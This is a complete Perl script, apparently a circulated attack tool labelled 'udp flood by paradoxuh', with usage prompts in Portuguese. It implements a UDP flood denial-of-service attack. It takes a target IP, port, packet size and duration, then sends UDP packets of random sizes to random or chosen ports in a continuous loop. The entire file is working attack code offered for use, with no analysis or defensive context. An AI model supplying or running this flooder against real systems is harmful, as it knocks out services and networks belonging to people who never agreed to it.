#!/usr/bin/perl

##########################
# udp flood by paradoxuh #
##########################
 
use Socket;
use strict;
 
if ($#ARGV != 3) {
  print "flood.pl <IP> <Porta> <Pacotes> <Tempo>\n\n";
  print " Porta = 0: Usar Portas aleatorias\n";
  print " Pacotes = 0: Usar entre 64 e 1024 Pacotes aleatorios\n";
  print " Tempo = 0: Ataque continuo\n";
  exit(1);
}
 
my ($ip,$port,$size,$time) = @ARGV;
 
my ($iaddr,$endtime,$psize,$pport);
 
$iaddr = inet_aton("$ip") or die "IP inválido: $ip\n";
$endtime = time() + ($time ? $time : 1000000);
 
socket(flood, PF_INET, SOCK_DGRAM, 17);

 
print "Atacando o IP e Porta $ip " . ($port ? $port : "random") . " com " . 
  ($size ? "$size-bytes" : "random size") . " de pacotes" . 
  ($time ? " por $time segundos" : "") . "\n";
print "Pare o ataque pressionando Ctrl + C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(10024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}